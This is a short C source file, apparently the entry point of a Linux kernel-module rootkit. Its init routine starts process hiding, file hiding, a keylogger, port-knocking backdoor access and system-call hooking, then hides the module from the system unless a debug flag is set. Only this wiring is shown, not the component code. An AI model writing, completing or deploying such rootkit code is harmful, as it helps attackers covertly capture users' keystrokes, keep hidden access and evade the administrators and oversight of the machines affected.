#include "main.h"

static int __init lkm_rootkit_init(void)
{
    if (proc_init() || hidefs_init() || keylogger_init() || port_knocking_init() || sys_call_init())
    {
        proc_clean();
        hidefs_clean();
        return -1;
    }

#if !DEBUG
    module_hide();
#endif

    return 0;
}

static void __exit lmk_rootkit_exit(void)
{
    proc_clean();
    hidefs_clean();
    keylogger_clean();
    port_knocking_clean();
    sys_call_clean();
}
